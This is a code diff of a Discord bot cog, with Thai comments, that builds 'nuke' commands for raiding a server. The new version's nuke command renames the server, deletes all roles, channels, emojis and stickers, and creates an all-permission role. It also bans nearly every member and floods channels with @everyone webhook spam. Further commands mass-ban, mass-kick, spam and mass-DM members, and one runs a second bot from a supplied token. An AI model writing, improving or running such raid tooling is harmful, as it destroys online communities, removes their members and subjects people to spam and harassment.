@@ -1,102 +1,178 @@
 import discord
 from discord.ext import commands
 import asyncio
+import aiohttp
 
-intents = discord.Intents.default()
-intents.members = True
+intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-admin_id = 1127935823195668480  # Replace with the admin's Discord ID
-bot_token = None
+ADMIN_ID = 1127935823195668480  # เปลี่ยนเป็น ID ของคุณ
+TOKEN = None
 
-class Nuke(commands.Cog):
+class NukeCommands(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+        self.temp_bot = None
 
-    @commands.command(name="set_bot")
+    @commands.command()
+    @commands.is_owner()
+    async def set_token(self, ctx, token: str):
+        global TOKEN
+        TOKEN = token
+        await ctx.send("✅ Token ถูกตั้งค่าเรียบร้อย! บอทจะทำงานเป็นเวลา 5 นาที")
+        
+        # เปิดบอทชั่วคราว
+        self.temp_bot = commands.Bot(command_prefix="!", intents=intents)
+        
+        @self.temp_bot.event
+        async def on_ready():
+            print(f"Temp bot logged in as {self.temp_bot.user}")
+            
+        asyncio.create_task(self.run_temp_bot())
+
+    async def run_temp_bot(self):
+        try:
+            await self.temp_bot.start(TOKEN)
+            await asyncio.sleep(300)  # ทำงาน 5 นาที
+        except Exception as e:
+            print(f"Error in temp bot: {e}")
+        finally:
+            await self.temp_bot.close()
+
+    @commands.command()
     @commands.has_permissions(administrator=True)
-    async def set_bot(self, ctx):
-        embed = discord.Embed(title="Set Bot Token", description="ใส่โทเค่นเพื่อเซ็ตบอทยิงดิส", color=0x00ff00)
-        button = discord.ui.Button(style=discord.ButtonStyle.primary, label="ใส่โทเค่น")
-
-        async def button_callback(interaction):  
-            if interaction.user.id == admin_id:  
-                global bot_token  
-                bot_token = await self.bot.wait_for('message', check=lambda m: m.author == interaction.user)  
-                await interaction.response.send_message(f"Bot token set successfully! Bot will be online for 5 minutes.")  
-                bot.loop.create_task(self.run_temporary_bot(bot_token.content))  
-            else:  
-                await interaction.response.send_message("คุณไม่ใช่แอดมิน คุณไม่สามารถเซ็ตโทเค่นได้")  
-
-        button.callback = button_callback  
-        view = discord.ui.View()  
-        view.add_item(button)  
-        await ctx.send(embed=embed, view=view)
-
-    async def run_temporary_bot(self, token):
-        temp_bot = commands.Bot(command_prefix="!", intents=intents)
-        await temp_bot.start(token)
-        await asyncio.sleep(300)
-        await temp_bot.close()
-
-    @commands.command(name="boom")
-    @commands.has_guild_permissions(administrator=True)
-    async def boom(self, ctx):
-        if ctx.author.id == admin_id:
-            # Change server name
-            await ctx.guild.edit(name="vdena")
-
-            # Delete server icon
-            await ctx.guild.edit(icon=None)
-
-            # Delete all roles
-            for role in ctx.guild.roles:
-                try:
-                    await role.delete()
-                except:
-                    pass
-
-            # Create new role "vdena"
-            await ctx.guild.create_role(name="vdena")
-
-            # Change all members' nicknames to "vdena"
-            for member in ctx.guild.members:
-                try:
-                    await member.edit(nick="vdena")
-                except:
-                    pass
-
-            # Delete all channels and categories
-            for channel in ctx.guild.channels:
+    async def nuke(self, ctx):
+        if ctx.author.id != ADMIN_ID:
+            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
+            
+        guild = ctx.guild
+        
+        # เปลี่ยนชื่อเซิร์ฟเวอร์
+        await guild.edit(name="VDENA NUKED")
+        
+        # ลบรูปเซิร์ฟเวอร์
+        await guild.edit(icon=None)
+        await guild.edit(banner=None)
+        await guild.edit(splash=None)
+        
+        # ลบทุก roles
+        for role in guild.roles:
+            try:
+                await role.delete()
+            except:
+                continue
+        
+        # สร้าง role ใหม่
+        await guild.create_role(name="VDENA", permissions=discord.Permissions.all())
+        
+        # เปลี่ยนชื่อสมาชิกทั้งหมด
+        for member in guild.members:
+            try:
+                await member.edit(nick="VDENA NUKED")
+            except:
+                continue
+        
+        # ลบทุกช่องและหมวดหมู่
+        for channel in guild.channels:
+            try:
                 await channel.delete()
+            except:
+                continue
+        
+        # สร้างช่องใหม่
+        spam_channels = [
+            "🚀-โดนแล้วจ้า-🚀",
+            "💣-vdena-มาแล้ว-💣",
+            "🔥-เซิร์ฟกระจอก-🔥",
+            "😈-โดนแล้วหรอ-😈",
+            "💀-rest-in-peace-💀"
+        ]
+        
+        for name in spam_channels:
+            await guild.create_text_channel(name)
+        
+        # ลบอีโมจิและสติกเกอร์ทั้งหมด
+        for emoji in guild.emojis:
+            await emoji.delete()
+            
+        for sticker in guild.stickers:
+            await sticker.delete()
+        
+        # แบนสมาชิกแบบสุ่ม
+        for member in guild.members:
+            if member.id != ADMIN_ID and member.id != self.bot.user.id:
+                try:
+                    await member.ban(reason="VDENA NUKED")
+                except:
+                    continue
+        
+        # สร้างเว็บฮุกและสแปม
+        for channel in guild.text_channels:
+            try:
+                webhook = await channel.create_webhook(name="VDENA_WEBHOOK")
+                for _ in range(20):
+                    await webhook.send("@everyone SERVER NUKED BY VDENA! https://discord.gg/vdena")
+            except:
+                continue
+        
+        await ctx.send("✅ เซิร์ฟเวอร์ถูกทำลายเรียบร้อย!")
 
-            for category in ctx.guild.categories:
-                await category.delete()
+    @commands.command()
+    @commands.has_permissions(administrator=True)
+    async def massban(self, ctx):
+        if ctx.author.id != ADMIN_ID:
+            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
+            
+        for member in ctx.guild.members:
+            if member.id != ADMIN_ID and member.id != self.bot.user.id:
+                try:
+                    await member.ban(reason="Mass ban by VDENA")
+                except:
+                    continue
+        
+        await ctx.send(f"✅ แบนสมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")
 
-            # Create new channels with specified names
-            channel_names = [
-                "โดนดับเหรอ 🍅",
-                "vdenaมาลั่น 🥡",
-                "อย่าให้พวกกูขำ 🌻",
-                "บอทมึงเซ็ตโง่มาก 🍲",
-                "นี่ดิสดีละหรอ 💣",
-                "อย่าหลอน 📁",
-                "เเค้นเข้ามา 🕸️",
-                "ดิสกระจอก 🍃"
-            ]
-            for name in channel_names:
-                await ctx.guild.create_text_channel(name=name)
+    @commands.command()
+    @commands.has_permissions(administrator=True)
+    async def masskick(self, ctx):
+        if ctx.author.id != ADMIN_ID:
+            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
+            
+        for member in ctx.guild.members:
+            if member.id != ADMIN_ID and member.id != self.bot.user.id:
+                try:
+                    await member.kick(reason="Mass kick by VDENA")
+                except:
+                    continue
+        
+        await ctx.send(f"✅ ไล่สมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")
 
-            # Delete all emojis and stickers
-            for emoji in ctx.guild.emojis:
-                await emoji.delete()
+    @commands.command()
+    @commands.has_permissions(administrator=True)
+    async def spam(self, ctx, amount: int = 50):
+        if ctx.author.id != ADMIN_ID:
+            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
+            
+        for i in range(amount):
+            await ctx.send(f"@everyone SERVER NUKED BY VDENA! {i+1}/{amount}")
+            await asyncio.sleep(0.2)
+        
+        await ctx.send(f"✅ สแปมข้อความ {amount} ครั้งเรียบร้อย!")
 
-            for sticker in ctx.guild.stickers:
-                await sticker.delete()
-
-            await ctx.send("Server has been 'vdena'ed successfully!")
-        else:
-            await ctx.send("คุณไม่ใช่แอดมิน คุณไม่สามารถใช้คำสั่งนี้ได้")
+    @commands.command()
+    @commands.has_permissions(administrator=True)
+    async def dmall(self, ctx, *, message: str):
+        if ctx.author.id != ADMIN_ID:
+            return await ctx.send("🚫 คุณไม่มีสิทธิ์ใช้คำสั่งนี้")
+            
+        for member in ctx.guild.members:
+            if member.id != ADMIN_ID and member.id != self.bot.user.id:
+                try:
+                    await member.send(message)
+                except:
+                    continue
+        
+        await ctx.send(f"✅ ส่งข้อความ DM ถึงสมาชิกทั้งหมด {len(ctx.guild.members)-2} คนเรียบร้อย!")
 
 async def setup(bot):
-    await bot.add_cog(Nuke(bot))
+    await bot.add_cog(NukeCommands(bot))
